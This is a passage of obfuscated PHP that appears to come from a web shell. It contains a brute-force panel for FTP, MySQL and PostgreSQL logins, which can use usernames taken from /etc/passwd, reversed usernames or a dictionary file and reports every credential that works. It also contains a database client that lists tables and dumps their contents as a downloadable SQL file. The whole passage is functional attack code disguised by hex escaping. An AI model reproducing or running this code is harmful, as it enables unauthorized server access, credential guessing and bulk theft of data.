69\x64n\x6c\x6a\x70"]="\x6ci\x6ee";${"G\x4cO\x42\x41\x4cS"}["t\x64bqu\x71\x6d\x6b\x65\x76\x74"]="tmp";${"\x47\x4c\x4f\x42\x41LS"}["\x68dj\x6a\x71\x79inh"]="\x69";${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["b\x6c\x75\x7aj\x78\x67d\x73\x72"]}="";for(${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x68\x64jj\x71yi\x6eh"]}=strlen(${$mqxmryeo}[0])-1;${${"\x47\x4c\x4f\x42\x41L\x53"}["d\x67\x74c\x66h\x63"]}>=0;--${${"G\x4c\x4fB\x41L\x53"}["\x72\x6cpb\x6c\x78"]})${${"G\x4cOBAL\x53"}["\x74d\x62\x71\x75\x71m\x6b\x65\x76\x74"]}.=${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x65\x6f\x63y\x75\x69\x64\x6e\x6c\x6ap"]}[0][${$wmxnhgicygd}];++${${"\x47L\x4f\x42AL\x53"}["\x6a\x62\x6b\x67\x72\x78tw\x6d"]};if(bruteForce(@${${"\x47LO\x42\x41\x4cS"}["\x72\x69\x72yw\x62\x67\x75\x67"]}[0],@${${"G\x4c\x4fB\x41\x4c\x53"}["e\x76\x6c\x78\x65\x6aj"]}[1],${$xrnqwf}[0],${${"\x47\x4c\x4f\x42A\x4c\x53"}["wbqdl\x68\x68"]})){${"\x47LOB\x41\x4cS"}["\x63n\x6a\x6b\x76i\x78\x68\x6dy\x68b"]="\x74m\x70";${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x66\x64\x76\x66\x64m\x62c"]}++;echo"<\x62\x3e".htmlspecialchars(${${"G\x4c\x4f\x42\x41\x4cS"}["\x62\x64x\x64\x78ko"]}[0])."\x3c/b\x3e:".htmlspecialchars(${${"GL\x4fBA\x4c\x53"}["\x63n\x6a\x6b\x76\x69xh\x6d\x79\x68\x62"]});}}}}}elseif($_POST["t\x79\x70e"]==2){${${"\x47L\x4f\x42\x41\x4c\x53"}["at\x66\x68\x73\x6ctogt"]}=@file($_POST["\x64ict"]);if(is_array(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x61\x74\x66h\x73\x6c\x74o\x67\x74"]})){foreach(${${"\x47\x4cO\x42\x41\x4c\x53"}["\x61\x74\x66\x68sl\x74o\x67t"]} as${${"\x47\x4cO\x42\x41\x4cS"}["bdx\x64\x78\x6b\x6f"]}){$sahfszkyljzt="line";${"\x47\x4cOB\x41LS"}["\x78\x77jf\x6e\x63"]="\x61\x74\x74\x65\x6dp\x74\x73";${${"\x47L\x4fB\x41\x4c\x53"}["\x62\x64\x78\x64\x78\x6b\x6f"]}=trim(${$sahfszkyljzt});$vovkmtt="\x73e\x72\x76e\x72";++${${"G\x4c\x4f\x42A\x4cS"}["\x78w\x6afnc"]};if(bruteForce(${$vovkmtt}[0],@${${"\x47\x4cOBA\x4c\x53"}["jsci\x65q"]}[1],$_POST["\x6c\x6fgi\x6e"],${${"\x47LOBA\x4c\x53"}["\x62\x64x\x64\x78k\x6f"]})){$ddyovbgsgq="\x73u\x63c\x65ss";${$ddyovbgsgq}++;echo"<\x62>".htmlspecialchars($_POST["\x6c\x6fg\x69n"])."</\x62\x3e:".htmlspecialchars(${${"\x47\x4c\x4fBAL\x53"}["\x62\x64x\x64x\x6b\x6f"]})."<b\x72>";}}}}echo"<s\x70\x61\x6e>A\x74\x74e\x6dpts:\x3c/\x73\x70an>\x20$attempts \x3cs\x70\x61n>\x53\x75\x63c\x65\x73s:</sp\x61n\x3e $success</\x64\x69\x76\x3e<\x62\x72\x3e";}echo"<h1\x3eF\x54\x50 b\x72\x75te\x66\x6f\x72\x63e\x3c/h\x31>\x3cd\x69\x76 \x63\x6ca\x73s\x3dco\x6e\x74e\x6et\x3e\x3ct\x61b\x6ce>\x3cf\x6f\x72\x6d\x20\x6de\x74h\x6f\x64=\x70\x6fst>\x3ct\x72\x3e\x3c\x74d\x3e\x3cs\x70an\x3e\x54y\x70e\x3c/\x73\x70an></td\x3e"."\x3c\x74\x64>\x3csel\x65\x63\x74\x20n\x61\x6d\x65\x3dpr\x6fto><opti\x6f\x6e\x20valu\x65\x3d\x66tp>FTP</o\x70\x74\x69o\x6e\x3e<op\x74i\x6fn\x20\x76\x61\x6c\x75\x65=\x6dys\x71l\x3e\x4dy\x53q\x6c\x3c/opti\x6f\x6e\x3e<\x6f\x70\x74i\x6fn\x20\x76\x61l\x75\x65\x3dpgsql\x3e\x50\x6f\x73\x74\x67re\x53ql\x3c/o\x70ti\x6fn>\x3c/sel\x65\x63\x74>\x3c/\x74\x64\x3e\x3c/\x74r\x3e\x3c\x74r>\x3ctd\x3e"."\x3cin\x70\x75t typ\x65=\x68\x69dde\x6e n\x61\x6d\x65\x3d\x63\x20v\x61l\x75\x65=\x22".htmlspecialchars($GLOBALS["cwd"])."\"\x3e"."\x3c\x69n\x70u\x74\x20ty\x70e\x3d\x68\x69\x64de\x6e\x20na\x6de\x3da\x20va\x6cue=\x22".htmlspecialchars($_POST["a"])."\"\x3e"."<in\x70ut\x20typ\x65=\x68\x69\x64den \x6e\x61\x6de=c\x68ars\x65\x74 v\x61lu\x65\x3d\x22".htmlspecialchars($_POST["ch\x61\x72se\x74"])."\"\x3e"."\x3c\x73p\x61\x6e\x3e\x53e\x72\x76e\x72:\x70or\x74</spa\x6e\x3e\x3c/t\x64\x3e"."\x3c\x74\x64><\x69\x6ep\x75t\x20t\x79\x70\x65\x3d\x74ext \x6ea\x6d\x65=\x73e\x72\x76e\x72 \x76alue\x3d\"\x31\x327\x2e\x30.0.\x31\"\x3e</td\x3e\x3c/t\x72\x3e"."\x3ct\x72\x3e\x3c\x74d>\x3c\x73\x70\x61\x6e\x3eBrut\x65\x20\x74\x79p\x65</\x73p\x61n>\x3c/t\x64\x3e"."\x3c\x74d><la\x62e\x6c><i\x6epu\x74\x20\x74\x79p\x65\x3drad\x69\x6f\x20n\x61me=\x74ype v\x61l\x75\x65\x3d\x22\x31\"\x20c\x68\x65\x63\x6bed>\x20/e\x74\x63/\x70\x61\x73\x73wd\x3c/\x6c\x61\x62el>\x3c/td\x3e</t\x72>"."\x3ct\x72\x3e<\x74\x64\x3e</t\x64\x3e<\x74d>\x3c\x6ca\x62e\x6c\x20\x73ty\x6ce=\"pa\x64din\x67-left:\x31\x35\x70x\x22><\x69nput\x20ty\x70\x65\x3dche\x63k\x62ox \x6eam\x65\x3d\x72e\x76erse\x20valu\x65=1 c\x68\x65\x63\x6bed\x3e r\x65\x76ers\x65\x20(\x6co\x67\x69n\x20->\x20\x6e\x69\x67\x6f\x6c)</label>\x3c/\x74\x64>\x3c/tr\x3e"."\x3c\x74r\x3e<\x74\x64></\x74d\x3e<\x74\x64\x3e\x3c\x6cab\x65\x6c\x3e\x3ci\x6e\x70\x75\x74\x20\x74y\x70\x65=\x72\x61d\x69\x6f\x20nam\x65=\x74\x79p\x65\x20\x76\x61lue\x3d\"2\x22>\x20D\x69\x63\x74\x69ona\x72\x79</\x6c\x61\x62e\x6c\x3e</t\x64\x3e</tr>"."\x3c\x74r><td>\x3c/td><t\x64\x3e<\x74a\x62\x6c\x65 styl\x65\x3d\"\x70\x61d\x64\x69n\x67-l\x65\x66\x74:1\x35\x70\x78\x22>\x3c\x74\x72>\x3c\x74d>\x3c\x73\x70a\x6e>\x4c\x6fgi\x6e\x3c/\x73pa\x6e\x3e\x3c/\x74\x64\x3e"."<\x74d\x3e\x3c\x69\x6e\x70\x75\x74\x20typ\x65\x3d\x74\x65xt\x20\x6eam\x65\x3d\x6cog\x69\x6e \x76alu\x65=\x22\x72o\x6ft\"\x3e\x3c/\x74d></\x74\x72>"."<t\x72>\x3c\x74\x64><\x73p\x61n>\x44ict\x69\x6fna\x72y\x3c/s\x70\x61n>\x3c/td\x3e"."<t\x64\x3e<i\x6ep\x75t t\x79p\x65=\x74ex\x74\x20n\x61\x6d\x65\x3ddic\x74 \x76\x61l\x75\x65=\"".htmlspecialchars($GLOBALS["\x63\x77d"])."\x70ass\x77\x64.\x64\x69c\x22\x3e\x3c/t\x64\x3e</\x74r></ta\x62le\x3e"."</t\x64\x3e</\x74r\x3e<\x74\x72\x3e<t\x64\x3e\x3c/\x74d\x3e<\x74d>\x3c\x69\x6e\x70\x75\x74\x20\x74\x79\x70e\x3dsu\x62m\x69t\x20\x76alu\x65\x3d\"\x3e>\"\x3e</td\x3e\x3c/\x74r>\x3c/\x66\x6f\x72\x6d></t\x61bl\x65>";echo"</\x64\x69v>\x3cb\x72\x3e";printFooter();}function actionSql(){class DbClass{var$type;var$link;var$res;function DbClass($type){${"\x47LO\x42A\x4c\x53"}["\x74pv\x76\x79\x76\x6d\x64wm"]="t\x79\x70\x65";$this->type=${${"\x47\x4c\x4f\x42A\x4c\x53"}["tp\x76v\x79v\x6d\x64wm"]};}function connect($host,$user,$pass,$dbname){${"\x47\x4c\x4f\x42\x41L\x53"}["\x6e\x75\x62c\x75t"]="p\x61s\x73";$trxtpfc="\x75s\x65\x72";switch($this->type){case"\x6d\x79s\x71\x6c":if($this->link=@mysql_connect($host,${$trxtpfc},${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6e\x75\x62c\x75\x74"]},true))return true;break;case"pgsq\x6c":$host=explode(":",$host);if(!$host[1])$host[1]=5432;if($this->link=@pg_connect("\x68o\x73t\x3d{$host[0]}\x20p\x6frt={$host[1]}\x20\x75ser\x3d$user\x20\x70as\x73\x77or\x64=$pass \x64b\x6e\x61me\x3d$dbname"))return true;break;}return false;}function selectdb($db){switch($this->type){case"\x6d\x79\x73\x71\x6c":if(@mysql_select_db(${${"\x47L\x4f\x42\x41\x4c\x53"}["\x77kk\x6do\x74u\x76\x65e\x6c"]}))return true;break;}return false;}function query($str){$dzvfuygd="\x73\x74r";switch($this->type){case"mysq\x6c":return$this->res=@mysql_query(${$dzvfuygd});break;case"\x70g\x73q\x6c":return$this->res=@pg_query($this->link,${${"\x47LO\x42\x41\x4c\x53"}["\x72\x73or\x6a\x67o\x66\x71\x71\x6fq"]});break;}return false;}function fetch(){$ihhdzcmncew="r\x65\x73";${${"\x47\x4c\x4f\x42\x41LS"}["\x6f\x67o\x67\x75\x6a\x6f\x6b\x66\x6d\x7a"]}=func_num_args()?func_get_arg(0):$this->res;switch($this->type){case"m\x79s\x71\x6c":return@mysql_fetch_assoc(${${"\x47LOB\x41\x4c\x53"}["og\x6fgu\x6a\x6f\x6bfm\x7a"]});break;case"\x70gs\x71l":return@pg_fetch_assoc(${$ihhdzcmncew});break;}return false;}function listDbs(){switch($this->type){case"\x6dy\x73ql":return$this->res=@mysql_list_dbs($this->link);break;case"pg\x73ql":return$this->res=$this->query("\x53\x45L\x45\x43T d\x61t\x6e\x61\x6d\x65\x20F\x52\x4f\x4d\x20\x70\x67_\x64\x61\x74\x61ba\x73e");break;}return false;}function listTables(){switch($this->type){case"\x6dy\x73ql":return$this->res=$this->query("S\x48OW\x20TABL\x45S");break;case"pgs\x71\x6c":return$this->res=$this->query("sel\x65\x63t\x20\x74\x61\x62\x6ce\x5fna\x6de \x66r\x6f\x6d \x69nf\x6f\x72m\x61\x74\x69o\x6e_sch\x65m\x61\x2e\x74\x61\x62l\x65s\x20w\x68ere (ta\x62l\x65\x5f\x73ch\x65\x6d\x61\x20\x21\x3d \x27i\x6e\x66\x6frm\x61\x74i\x6fn_\x73\x63\x68e\x6da'\x20A\x4e\x44 \x74\x61\x62\x6c\x65\x5fs\x63\x68e\x6da !=\x20\x27\x70g_\x63at\x61\x6co\x67') \x6fr\x20ta\x62l\x65\x5f\x6e\x61me\x20= \x27\x70\x67\x5f\x75ser\x27");break;}return false;}function error(){switch($this->type){case"\x6d\x79\x73q\x6c":return@mysql_error($this->link);break;case"\x70\x67\x73\x71l":return@pg_last_error($this->link);break;}return false;}function setCharset($str){switch($this->type){case"\x6d\x79\x73\x71\x6c":if(function_exists("\x6dysql\x5fs\x65t_\x63\x68ar\x73\x65t"))return@mysql_set_charset(${${"\x47LO\x42A\x4cS"}["r\x73\x6f\x72\x6a\x67\x6f\x66q\x71\x6f\x71"]},$this->link);else$this->query("SET\x20C\x48AR\x53\x45\x54\x20".${${"\x47LO\x42A\x4cS"}["\x72sorj\x67of\x71\x71\x6fq"]});break;case"\x6d\x79\x73\x71l":return@pg_set_client_encoding($this->link,${${"\x47L\x4f\x42\x41\x4c\x53"}["\x72s\x6f\x72j\x67\x6ff\x71\x71\x6f\x71"]});break;}return false;}function dump($table){$akcvopcqk="\x72\x65\x73";${"\x47LO\x42A\x4c\x53"}["nl\x75\x64\x63pi\x6e"]="ta\x62l\x65";$jfglhripnb="\x69\x74e\x6d";$yiipjob="\x74\x61b\x6c\x65";switch($this->type){case"m\x79\x73q\x6c":${${"\x47LOB\x41\x4cS"}["o\x67\x6fg\x75\x6a\x6f\x6bf\x6d\x7a"]}=$this->query("SHO\x57 \x43\x52EATE\x20TAB\x4cE \x60".${$yiipjob}."\x60");${${"\x47L\x4f\x42A\x4c\x53"}["bm\x6e\x65\x72\x74\x63"]}=mysql_fetch_array(${$akcvopcqk});echo${${"GLOBA\x4cS"}["\x62\x6d\x6ee\x72\x74\x63"]}[1].";\n\n";$this->query("\x53EL\x45C\x54 *\x20F\x52OM `".${${"G\x4cO\x42A\x4c\x53"}["im\x74ag\x77\x6d\x69x\x64"]}."`");while(${$jfglhripnb}=$this->fetch()){${"\x47\x4cO\x42ALS"}["\x72i\x73\x67c\x72\x70\x63\x68th"]="\x76";$jkywwpebwp="\x63\x6f\x6cu\x6d\x6e\x73";${$jkywwpebwp}=array();$xpmnhqay="\x6b";foreach(${${"\x47LO\x42\x41L\x53"}["yp\x63\x63\x75g"]} as${$xpmnhqay}=>${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x72i\x73g\x63\x72\x70c\x68th"]}){$oiugvd="\x6b";$orbyczmnqlj="c\x6fl\x75\x6dns";$dldean="\x76";$nojrtqthxog="\x6b";${${"\x47\x4cOBA\x4c\x53"}["\x79\x70\x63\x63u\x67"]}[${$nojrtqthxog}]="\x27".@mysql_real_escape_string(${$dldean})."\x27";${$orbyczmnqlj}[]="`".${$oiugvd}."`";}echo"I\x4e\x53ERT\x20I\x4eTO `".${${"\x47\x4c\x4f\x42A\x4c\x53"}["im\x74\x61gw\x6d\x69xd"]}."` (".implode(",\x20",${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["i\x6d\x6b\x7a\x77\x65\x65"]}).") V\x41\x4cUES\x20(".implode(", ",${${"GLO\x42AL\x53"}["\x79\x70ccug"]}).")\x3b"."\n";}break;case"\x70\x67\x73\x71l":$this->query("\x53E\x4c\x45\x43T *\x20F\x52\x4f\x4d\x20".${${"G\x4cO\x42\x41L\x53"}["\x6e\x6c\x75\x64cp\x69\x6e"]});while(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["y\x70\x63\x63\x75\x67"]}=$this->fetch()){$egsmwvfhii="\x69\x74\x65m";${${"\x47\x4cOB\x41\x4c\x53"}["\x69\x6dk\x7aw\x65e"]}=array();${"\x47L\x4fBA\x4c\x53"}["\x6a\x6df\x66\x78\x6d\x67q\x73w\x76"]="i\x74\x65m";${"GLO\x42AL\x53"}["\x73i\x68\x76\x79\x68\x6f\x6c\x6cj"]="\x6b";$fpnhdhhb="\x74\x61\x62\x6ce";foreach(${$egsmwvfhii} as${${"\x47\x4c\x4f\x42\x41L\x53"}["\x73\x69\x68\x76\x79\x68\x6f\x6c\x6cj"]}=>${${"\x47\x4c\x4fB\x41L\x53"}["\x64n\x6e\x72k\x6a\x75\x73\x6a"]}){${"\x47\x4cOB\x41\x4cS"}["\x6an\x6ft\x74\x71"]="\x63\x6f\x6cum\x6e\x73";${"\x47\x4c\x4fBA\x4c\x53"}["\x62\x74ixct\x74\x61\x6a\x6f"]="\x6b";$btpgpct="\x76";${${"GL\x4f\x42\x41\x4c\x53"}["\x79pccu\x67"]}[${${"\x47\x4c\x4f\x42\x41LS"}["b\x74\x69\x78\x63\x74\x74\x61\x6ao"]}]="'".addslashes(${$btpgpct})."'";${${"\x47L\x4fB\x41\x4c\x53"}["\x6ano\x74\x74q"]}[]=${${"\x47L\x4f\x42\x41\x4c\x53"}["\x76\x70\x62\x66x\x63\x6d"]};}echo"I\x4e\x53E\x52T\x20I\x4eT\x4f ".${$fpnhdhhb}."\x20(".implode(", ",${${"G\x4c\x4fB\x41L\x53"}["\x69\x6dkzw\x65\x65"]}).") \x56\x41LU\x45S (".implode(",\x20",${${"\x47\x4c\x4fB\x41LS"}["\x6am\x66\x66x\x6d\x67\x71s\x77\x76"]}).")\x3b"."\n";}break;}return false;}}${${"\x47L\x4f\x42A\x4c\x53"}["w\x6b\x6bm\x6f\x74\x75\x76\x65el"]}=new DbClass($_POST["\x74yp\x65"]);if(@$_POST["p\x32"]=="do\x77\x6elo\x61d"){ob_start("o\x62_g\x7a\x68a\x6e\x64\x6c\x65\x72",4096);$db->connect($_POST["\x73q\x6c_\x68\x6fst"],$_POST["sq\x6c_\x6cog\x69n"],$_POST["s\x71\x6c\x5fpa\x73\x73"],$_POST["s\x71\x6c\x5f\x62as\x65"]);${"\x47\x4cOBA\x4c\x53"}["\x6f\x68q\x69\x69o\x72"]="\x76";$db->selectdb($_POST["\x73ql\x5fb\x61se"]);header("\x43\x6fnt\x65n\x74-\x44isp\x6f\x73\x69t\x69o\x6e:\x20\x61\x74ta\x63\x68\x6d\x65n\x74\x3b fi\x6ce\x6ea\x6d\x65=du\x6dp.\x73\x71\x6c");${"\x47\x4c\x4f\x42\